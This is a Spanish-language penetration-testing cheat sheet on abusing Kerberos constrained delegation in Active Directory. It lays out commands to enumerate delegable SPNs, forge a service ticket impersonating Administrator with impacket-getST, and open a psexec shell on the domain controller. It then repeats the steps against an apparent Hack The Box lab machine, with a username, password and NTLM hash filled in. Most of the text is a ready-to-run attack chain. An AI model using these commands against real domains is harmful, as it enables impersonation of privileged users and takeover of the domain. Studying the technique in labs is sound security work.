Kerberos Constrained Delegation

La delegación Kerberos restringida permite solicitar tickets hacia servicios concretos si el objeto está configurado para delegar.

Aviso: AllowedToDelegate

Permite que una cuenta o equipo impersone a otros usuarios frente a un servicio concreto mediante Kerberos Delegation

Ejemplo: el usuario web_service puede delegar el servicio HTTP al controlador de dominio DC1, por lo que puede solicitar un ticket Kerberos para otro usuario del AD y usarlo contra ese servicio.

Enumerar SPN asociadas a servicios delegables

pywerview get-netcomputer -u '<user_domain>' -p '<pass_domain>' -t '<dc_ip>' --full-data
# Buscar etiqueta-> msds-allowedtodelegate: SPN

Impersonar al usuario Administrator

impacket-getST -spn '<SPN>' -impersonate 'Administrator' -p '<pass>' '<domain>/<user_with_kerberos_delegation>'

Exportar Credenciales de Kerberos

export KRB5CCNAME=file.ccache

Acceso PSEXEC con Kerberos

impacket-psexec '<hostname>'.'<domain>' -k -no-pass

Enumerar SPN asociadas a servicios delegables con credenciales del dominio

pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.129.95.154 --full-data
# Usuario: svc_int
# AllowedToDelegateTo SPN: WWW/dc.intelligence.htb

Impersonar al usuario Administrator

impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -hashes :d5538dca5ba2ff329c9df39ef130f439 'intelligence.htb/svc_int$'

Exportar credenciales Administrator

export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

Acceso PSEXEC con Kerberos

impacket-psexec dc.intelligence.htb -k -no-pass
